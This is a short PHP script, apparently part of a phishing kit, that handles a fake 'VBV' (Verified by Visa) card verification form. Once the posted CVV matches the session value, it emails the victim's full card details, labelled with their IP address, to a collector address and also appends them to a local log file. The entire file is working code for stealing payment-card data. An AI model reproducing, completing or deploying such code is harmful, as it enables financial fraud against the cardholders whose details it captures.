<?php
session_start();

sleep(2);
$GETCVV = $_POST['CVV'];
if($GETCVV != $_SESSION['CVV']){
	echo "YOUHAVEERRORBRO";
}else{
	include("../send/functionsend.php");
    include("../send/mail.php");
	$head = "MIME-Version: 1.0" . "\r\n";
    $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $head .= "From: $from\r\n";
    $subject = "New VBV Full Info Form : ".getenv("REMOTE_ADDR");
	@mail($to,$subject,functionsend::Cardvbv(),$head);
    $f = fopen($save, "a+");
    fwrite($f, functionsend::Cardvbv());
    fclose($f);
}
?>